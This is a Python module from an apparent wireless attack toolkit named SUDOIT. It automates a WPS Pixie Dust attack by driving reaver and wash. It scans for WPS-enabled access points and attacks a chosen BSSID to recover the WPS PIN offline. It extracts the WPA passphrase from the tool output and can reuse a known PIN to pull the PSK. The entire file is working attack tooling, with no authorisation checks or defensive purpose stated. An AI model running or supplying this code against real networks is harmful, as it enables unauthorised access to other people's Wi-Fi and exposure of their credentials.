#!/usr/bin/env python3
"""
SUDOIT WPS Pixie Dust Attack Module
Exploit vulnerable WPS implementations to recover PIN/PSK.
"""

import os
import time
import re
import subprocess
from datetime import datetime
from typing import Optional, Dict, Tuple

try:
    from core.logger import get_logger
except ImportError:
    import logging
    def get_logger(name="SUDOIT"):
        return logging.getLogger(name)


class PixieDustAttack:
    """
    WPS Pixie Dust Attack Module.
    
    Exploits weak random number generation in WPS implementations
    to recover the WPS PIN offline, then uses it to retrieve
    the WPA/WPA2 passphrase.
    
    Requirements:
        - reaver (with Pixie Dust support)
        - wash (for WPS detection)
        - Monitor mode interface
    """
    
    def __init__(self, interface: str = "wlan0mon", logger=None):
        self.interface = interface
        self.logger = logger or get_logger()
        self.running = False
        self._proc = None
        self._start_time = None
        self._pin: Optional[str] = None
        self._psk: Optional[str] = None
    
    def attack(self, target_bssid: str, channel: int,
               timeout: int = 120, pixie_only: bool = True) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Launch Pixie Dust attack against target.
        
        Args:
            target_bssid: Target BSSID
            channel: WiFi channel
            timeout: Attack timeout in seconds
            pixie_only: Only use Pixie Dust, no brute force
        
        Returns:
            Tuple of (success, pin, psk)
        """
        self.logger.info(f"Pixie Dust attack on {target_bssid} (ch:{channel})")
        self.running = True
        self._start_time = time.time()
        self._pin = None
        self._psk = None
        
        print(f"\n[*] WPS Pixie Dust Attack")
        print(f"    Target:  {target_bssid}")
        print(f"    Channel: {channel}")
        print(f"    Timeout: {timeout}s")
        print(f"    Mode:    {'Pixie Only' if pixie_only else 'Full Attack'}\n")
        
        # Set channel
        self._set_channel(channel)
        
        # Build reaver command
        output_file = f"/tmp/sudoit_wps_{target_bssid.replace(':', '')}"
        
        cmd = [
            "reaver",
            "-i", self.interface,
            "-b", target_bssid,
            "-c", str(channel),
            "-K", "1",           # Pixie Dust mode
            "-vv",               # Verbose
            "-o", output_file,   # Output file
            "-f",                # Fixed channel
        ]
        
        if pixie_only:
            cmd.append("--pixie-dust")
            cmd.append("--no-nacks")
        
        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            pin_found = False
            psk_found = False
            start = time.time()
            
            while time.time() - start < timeout:
                if not self.running:
                    break
                
                line = self._proc.stdout.readline()
                if not line:
                    break
                
                line = line.strip()
                if not line:
                    continue
                
                # Show progress (filter noise)
                if any(kw in line for kw in ["Pixie", "PIN", "WPA", "PSK", "WPS", "Received"]):
                    print(f"  {line}")
                
                # Check for PIN
                pin_match = re.search(r"WPS PIN:\s*['\"]?(\d{8})['\"]?", line)
                if pin_match:
                    self._pin = pin_match.group(1)
                    pin_found = True
                    print(f"\n[✓] WPS PIN FOUND: {self._pin}")
                    self.logger.info(f"WPS PIN found: {self._pin}")
                
                # Check for PSK
                psk_match = re.search(r"WPA PSK:\s*['\"]?(.+?)['\"]?$", line)
                if psk_match:
                    self._psk = psk_match.group(1).strip()
                    psk_found = True
                    print(f"\n[✓] WPA PSK FOUND: {self._psk}")
                    self.logger.info(f"WPA PSK found: {self._psk}")
                    break  # Got what we need
            
            # Terminate
            self._proc.terminate()
            self._proc.wait(timeout=5)
            
            elapsed = time.time() - self._start_time
            
            if psk_found:
                print(f"\n[✓] Attack successful in {elapsed:.1f}s")
                return (True, self._pin, self._psk)
            elif pin_found:
                print(f"\n[~] PIN found but no PSK (AP may require PIN exchange)")
                print(f"    PIN: {self._pin}")
                print(f"    Try manual: reaver -i {self.interface} -b {target_bssid} -c {channel} -p {self._pin}")
                return (True, self._pin, None)
            else:
                print(f"\n[✗] Attack failed after {elapsed:.1f}s")
                print(f"    Target may not be vulnerable to Pixie Dust")
                return (False, None, None)
                
        except FileNotFoundError:
            print(f"[✗] reaver not found! Install: apt install reaver")
            self.logger.error("reaver not installed")
            return (False, None, None)
        except Exception as e:
            self.logger.error(f"Pixie Dust error: {e}")
            print(f"[✗] Error: {e}")
            return (False, None, None)
        finally:
            self.running = False
            self._cleanup()
    
    def scan_wps(self, timeout: int = 30) -> list:
        """
        Scan for WPS-enabled access points using wash.
        
        Returns:
            List of dicts with WPS AP info
        """
        print(f"\n[*] Scanning for WPS-enabled APs ({timeout}s)...")
        
        cmd = [
            "wash",
            "-i", self.interface,
            "-j",  # JSON output if supported
        ]
        
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            wps_aps = []
            start = time.time()
            
            while time.time() - start < timeout:
                line = proc.stdout.readline()
                if not line:
                    break
                
                line = line.strip()
                if line and not line.startswith("-"):
                    print(f"  {line}")
                    # Parse wash output
                    parts = line.split()
                    if len(parts) >= 6:
                        try:
                            wps_aps.append({
                                "bssid": parts[0],
                                "channel": parts[1],
                                "signal": parts[2],
                                "wps_version": parts[3],
                                "locked": "Locked" in line,
                                "ssid": parts[-1] if len(parts) > 6 else "Unknown"
                            })
                        except:
                            pass
            
            proc.terminate()
            print(f"\n[*] Found {len(wps_aps)} WPS-enabled APs")
            return wps_aps
            
        except FileNotFoundError:
            print(f"[✗] wash not found! Install: apt install reaver")
            return []
        except Exception as e:
            self.logger.error(f"WPS scan error: {e}")
            return []
    
    def bruteforce_pin(self, target_bssid: str, channel: int,
                       pin: Optional[str] = None) -> Optional[str]:
        """
        Use known PIN to retrieve PSK.
        
        Args:
            target_bssid: Target BSSID
            channel: WiFi channel
            pin: Known WPS PIN (if None, use previously found PIN)
        
        Returns:
            PSK string or None
        """
        pin = pin or self._pin
        if not pin:
            print(f"[✗] No PIN available. Run Pixie Dust first.")
            return None
        
        print(f"\n[*] Retrieving PSK with PIN: {pin}")
        
        cmd = [
            "reaver",
            "-i", self.interface,
            "-b", target_bssid,
            "-c", str(channel),
            "-p", pin,
            "-vv"
        ]
        
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            start = time.time()
            while time.time() - start < 30:
                line = proc.stdout.readline()
                if not line:
                    break
                
                line = line.strip()
                if line:
                    print(f"  {line}")
                
                psk_match = re.search(r"WPA PSK:\s*['\"]?(.+?)['\"]?$", line)
                if psk_match:
                    psk = psk_match.group(1).strip()
                    print(f"\n[✓] PSK: {psk}")
                    return psk
            
            proc.terminate()
            return None
            
        except Exception as e:
            self.logger.error(f"PIN brute error: {e}")
            return None
    
    def _set_channel(self, channel: int):
        """Set interface channel."""
        subprocess.run(
            ["iwconfig", self.interface, "channel", str(channel)],
            capture_output=True
        )
    
    def _cleanup(self):
        """Clean up subprocess."""
        if self._proc:
            try:
                self._proc.terminate()
            except:
                pass
    
    def stop(self):
        """Stop ongoing attack."""
        self.running = False
        self._cleanup()
        self.logger.info("Pixie Dust attack stopped")
    
    def is_running(self) -> bool:
        """Check if attack is running."""
        return self.running
    
    def get_status(self) -> Dict:
        """Get current attack status."""
        return {
            "running": self.running,
            "pin_found": self._pin,
            "psk_found": self._psk,
            "elapsed": time.time() - self._start_time if self._start_time else 0
        }
